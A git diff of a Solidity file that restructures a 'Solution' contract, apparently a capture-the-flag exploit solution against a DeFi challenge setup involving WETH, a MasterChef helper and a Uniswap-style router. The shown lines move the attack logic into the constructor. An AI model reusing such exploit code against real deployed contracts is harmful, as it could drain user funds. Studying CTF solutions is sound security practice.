@@ -83,10 +83,14 @@ interface ISetup {
     function weth() external view returns (WETH9);
 }
 
-contract Rescue {
-    function main(WETH9 weth, IMasterChefHelper mcHelper) external payable {
+contract Solution {
+
+    // Send more that 10 ETH along with the deployment
+    constructor(ISetup setup) payable {
         require(msg.value > 10 ether, "need more than 10 ether");
 
+        WETH9 weth = setup.weth();
+        IMasterChefHelper mcHelper = setup.mcHelper();
         UniswapV2RouterLike router = mcHelper.router();
         MasterChefLike masterchef = mcHelper.masterchef();
 
@@ -146,13 +150,5 @@ contract Rescue {
             ERC20Like(tokenB).balanceOf(address(this)),
             0
         );
-    }
-}
-
-contract Solution {
-    // Send more that 10 ETH along with the deployment
-    constructor(ISetup setup) payable {
-        Rescue rescue = new Rescue();
-        rescue.main{value: msg.value}(setup.weth(), setup.mcHelper());
     }
 }
